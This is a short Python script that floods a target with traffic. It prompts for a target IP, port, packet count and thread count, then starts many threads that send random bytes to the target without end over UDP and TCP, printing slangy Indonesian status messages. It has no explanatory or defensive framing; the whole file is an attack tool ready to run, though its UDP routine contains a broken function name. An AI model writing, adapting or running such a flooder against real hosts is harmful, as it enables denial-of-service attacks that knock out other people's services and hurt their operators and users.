import random
import socket
import threading
import os,sys
import time

ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input(" Gas Bwanv(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urando(1800)
	i = random.choice(("[Xz]","[Xz]","[Xz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MAESTRO!!!")
		except:
			print("[X] AMPUN BANG!!!")

def run2():
	data = random._urandom(180)
	i = random.choice(("[Xz]","[Xz]","[Xz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MAESTRO!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

def run3():
	data = random._urandom(16)
	i = random.choice(("[Xz]","[Xz]","[Xz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MAESTRO!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start() 
